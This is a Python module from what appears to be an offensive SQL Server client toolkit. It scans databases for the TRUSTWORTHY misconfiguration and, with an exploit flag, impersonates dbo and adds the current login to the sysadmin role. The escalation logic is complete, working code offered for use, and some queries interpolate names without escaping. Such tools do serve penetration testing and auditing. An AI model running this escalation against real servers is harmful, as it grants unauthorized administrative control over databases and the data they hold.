# /mssqlclient_ng/core/actions/administration/trustworthy.py

from typing import Optional, List, Dict
from loguru import logger

from ..base import BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from ...utils.formatter import OutputFormatter


@ActionFactory.register(
    "trustworthy",
    "Check for privilege escalation vulnerabilities via TRUSTWORTHY database setting",
)
class Trustworthy(BaseAction):
    """
    Checks for privilege escalation vulnerabilities via the TRUSTWORTHY database setting.

    This action identifies databases that are vulnerable to privilege escalation attacks
    where a low-privileged user (e.g., db_owner) can escalate to sysadmin by exploiting:

    1. Database owner with sysadmin privileges (often 'sa')
    2. TRUSTWORTHY database property set to ON
    3. User membership in db_owner role (can impersonate dbo)

    Usage:
    - No arguments: Check all databases for privilege escalation vulnerabilities
    - trustworthy [database]: Check specific database
    - trustworthy -d [database] -e: Exploit and escalate current user to sysadmin
    """

    def __init__(self):
        super().__init__()
        self._database: Optional[str] = None
        self._exploit_mode: bool = False

    def validate_arguments(self, additional_arguments: str) -> None:
        """
        Validate arguments for trustworthy action.

        Args:
            additional_arguments: Command line arguments as string

        Raises:
            ValueError: If exploit mode is specified without database
        """
        named_args, positional_args = self._parse_action_arguments(additional_arguments)

        # Get database from positional or named arguments
        if len(positional_args) >= 1:
            self._database = positional_args[0]
        else:
            self._database = None

        if not self._database:
            self._database = named_args.get("database", named_args.get("d"))

        # Check for exploit flag
        if "exploit" in named_args or "e" in named_args:
            self._exploit_mode = True

        # Exploit mode requires a database
        if self._exploit_mode and not self._database:
            raise ValueError(
                "Exploit mode requires a database name. Usage: trustworthy -d <database> -e"
            )

    def execute(self, database_context: DatabaseContext) -> Optional[object]:
        """
        Execute trustworthy check or exploitation.

        Args:
            database_context: The database context

        Returns:
            Scan results or exploitation status
        """
        # If exploit mode, perform actual privilege escalation
        if self._exploit_mode:
            return self._exploit_privilege_escalation(database_context, self._database)

        # Otherwise, scan for vulnerable databases
        return self._scan_vulnerable_databases(database_context, self._database)

    def _scan_vulnerable_databases(
        self, database_context: DatabaseContext, specific_database: Optional[str]
    ) -> Optional[List[Dict]]:
        """
        Scan databases for TRUSTWORTHY privilege escalation vulnerabilities.

        Args:
            database_context: The database context
            specific_database: Specific database to check, or None for all

        Returns:
            List of database vulnerability information
        """
        if not specific_database:
            logger.info(
                "Scanning all databases for TRUSTWORTHY privilege escalation vulnerabilities"
            )
        else:
            logger.info(
                f"Checking database '{specific_database}' for TRUSTWORTHY vulnerabilities"
            )

        database_filter = (
            ""
            if not specific_database
            else "AND d.name = '" + specific_database.replace("'", "''") + "'"
        )

        # Query to find vulnerable databases
        query = f"""
DECLARE @Results TABLE (
    [Database] NVARCHAR(128),
    [DatabaseID] INT,
    [Owner] NVARCHAR(128),
    [Trustworthy] BIT,
    [OwnerIsSysadmin] VARCHAR(3),
    [Created] DATETIME,
    [State] NVARCHAR(60),
    [CurrentUserIsDbOwner] VARCHAR(3)
);

DECLARE @dbname NVARCHAR(128);
DECLARE @sql NVARCHAR(MAX);
DECLARE @owner NVARCHAR(128);
DECLARE @trustworthy BIT;
DECLARE @ownerIsSysadmin VARCHAR(3);
DECLARE @created DATETIME;
DECLARE @state NVARCHAR(60);
DECLARE @dbid INT;
DECLARE @isDbOwner VARCHAR(3);

DECLARE db_cursor CURSOR FOR
SELECT
    name,
    database_id,
    SUSER_SNAME(owner_sid) AS [Owner],
    is_trustworthy_on,
    CASE
        WHEN IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(owner_sid)) = 1 THEN 'YES'
        ELSE 'NO'
    END AS [OwnerIsSysadmin],
    create_date,
    state_desc
FROM sys.databases
{database_filter}

OPEN db_cursor;
FETCH NEXT FROM db_cursor INTO @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin, @created, @state;

WHILE @@FETCH_STATUS = 0
BEGIN
    SET @isDbOwner = 'NO';

    -- Check if current user has access and is db_owner in this database (only for ONLINE databases)
    IF HAS_DBACCESS(@dbname) = 1 AND @state = 'ONLINE'
    BEGIN
        BEGIN TRY
            SET @sql = N'USE [' + REPLACE(@dbname, ']', ']]') + N'];
                         SELECT @result = CASE WHEN IS_MEMBER(''db_owner'') = 1 THEN ''YES'' ELSE ''NO'' END;';
            EXEC sp_executesql @sql, N'@result VARCHAR(3) OUTPUT', @result = @isDbOwner OUTPUT;
        END TRY
        BEGIN CATCH
            SET @isDbOwner = 'NO';
        END CATCH
    END

    INSERT INTO @Results VALUES (
        @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin,
        @created, @state, @isDbOwner
    );

    FETCH NEXT FROM db_cursor INTO @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin, @created, @state;
END;

CLOSE db_cursor;
DEALLOCATE db_cursor;

SELECT * FROM @Results
ORDER BY [Database];
"""

        try:
            results = database_context.query_service.execute_table(query)

            if not results:
                logger.warning(
                    "No user databases found or no access to check TRUSTWORTHY settings."
                )
                return results

            # Add computed columns for Vulnerable and Exploitable flags
            vulnerable = 0
            exploitable = 0

            for row in results:
                trustworthy = bool(row["Trustworthy"])
                owner_is_sysadmin = row["OwnerIsSysadmin"]
                current_user_is_db_owner = row.get("CurrentUserIsDbOwner", "NO")

                # Determine if vulnerable
                is_vulnerable = trustworthy and owner_is_sysadmin == "YES"
                row["Vulnerable"] = "YES" if is_vulnerable else "NO"

                # Determine if exploitable
                is_exploitable = is_vulnerable and current_user_is_db_owner == "YES"
                row["Exploitable"] = "YES" if is_exploitable else "NO"

                if is_vulnerable:
                    vulnerable += 1
                    if is_exploitable:
                        exploitable += 1

            # Sort by priority: Exploitable > Vulnerable > Trustworthy > Database name
            def sort_key(row):
                return (
                    row["Exploitable"] == "NO",  # False (exploitable) sorts first
                    row["Vulnerable"] == "NO",  # False (vulnerable) sorts first
                    not row["Trustworthy"],  # True (trustworthy) sorts first
                    row["Database"],  # Alphabetically by database name
                )

            results.sort(key=sort_key)

            print(OutputFormatter.convert_list_of_dicts(results))

            # Display enhanced summary
            if vulnerable > 0:
                logger.success(
                    f"Found {vulnerable} vulnerable database(s) with TRUSTWORTHY=ON and sysadmin owner"
                )

                if exploitable > 0:
                    logger.warning(
                        f"{exploitable} of {vulnerable} vulnerable database(s) are immediately exploitable (you are db_owner)"
                    )
                    logger.warning(
                        "Use 'trustworthy <database> -e' to escalate to sysadmin"
                    )
                else:
                    logger.info(
                        "None are currently exploitable by your user (not db_owner)"
                    )
            elif any(row["Trustworthy"] for row in results):
                logger.warning(
                    "Found databases with TRUSTWORTHY=ON but owners are not sysadmin"
                )
                logger.warning(
                    "These are misconfigured but not exploitable for privilege escalation"
                )
            else:
                logger.success("No TRUSTWORTHY vulnerabilities detected")

            return results

        except Exception as ex:
            logger.error(f"Error scanning databases: {ex}")
            return None

    def _exploit_privilege_escalation(
        self, database_context: DatabaseContext, database: str
    ) -> Optional[bool]:
        """
        Exploits TRUSTWORTHY vulnerability to escalate current user to sysadmin.

        Args:
            database_context: The database context
            database: Database to exploit

        Returns:
            True if successful, False otherwise
        """
        logger.info(f"Exploiting TRUSTWORTHY vulnerability on database '{database}'")
        logger.info("This will escalate your current user to sysadmin")

        try:
            if database_context.user_service.is_admin():
                logger.success("Already sysadmin. No escalation needed.")
                return True

            # Get current login
            current_login_query = "SELECT SUSER_NAME() AS [CurrentLogin];"
            login_info = database_context.query_service.execute_table(
                current_login_query
            )
            current_login = login_info[0]["CurrentLogin"]

            escaped_db = database.replace("'", "''")
            db_props_query = f"""
SELECT
    d.name AS [Database],
    SUSER_SNAME(d.owner_sid) AS [Owner],
    d.is_trustworthy_on AS [Trustworthy],
    IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) AS [OwnerIsSysadmin]
FROM sys.databases d
WHERE d.name = '{escaped_db}';
"""

            db_props = database_context.query_service.execute_table(db_props_query)

            if not db_props:
                logger.error(f"Database '{database}' not found or no access.")
                return False

            owner = db_props[0]["Owner"]
            trustworthy = bool(db_props[0]["Trustworthy"])
            owner_is_sysadmin = int(db_props[0]["OwnerIsSysadmin"]) == 1

            # Verify db_owner membership
            membership_query = (
                f"USE [{database}]; SELECT IS_MEMBER('db_owner') AS [IsDbOwner];"
            )
            membership = database_context.query_service.execute_table(membership_query)
            is_db_owner = int(membership[0]["IsDbOwner"]) == 1

            # Check if vulnerable
            if not trustworthy or not owner_is_sysadmin or not is_db_owner:
                if not trustworthy:
                    logger.error("TRUSTWORTHY is OFF")
                if not owner_is_sysadmin:
                    logger.error(f"Database owner '{owner}' is not sysadmin")
                if not is_db_owner:
                    logger.error("Current user is not db_owner")

                return False

            logger.info(f"Escalating user '{current_login}' to sysadmin")

            exploit_query = f"""
USE [{database}];
EXECUTE AS USER = 'dbo';
ALTER SERVER ROLE sysadmin ADD MEMBER [{current_login}];
SELECT
    '{current_login}' AS [Login],
    IS_SRVROLEMEMBER('sysadmin', '{current_login}') AS [IsSysadmin];
REVERT;
"""

            try:
                result = database_context.query_service.execute_table(exploit_query)

                if result:
                    escalated = int(result[0]["IsSysadmin"]) == 1

                    if escalated:
                        logger.success(f"User '{current_login}' is now SYSADMIN!")
                        logger.success(
                            f"ALTER SERVER ROLE sysadmin DROP MEMBER [{current_login}];"
                        )
                        return True

                    logger.error("Escalation failed. User not added to sysadmin role.")
                    return False

                logger.error("Escalation failed. No result returned.")
                return False

            except Exception as ex:
                logger.error(f"Exploitation failed: {ex}")
                return False

        except Exception as ex:
            logger.error(f"Error during exploitation: {ex}")
            return False

    def get_arguments(self) -> List[str]:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return ["[database] [-e/--exploit]"]
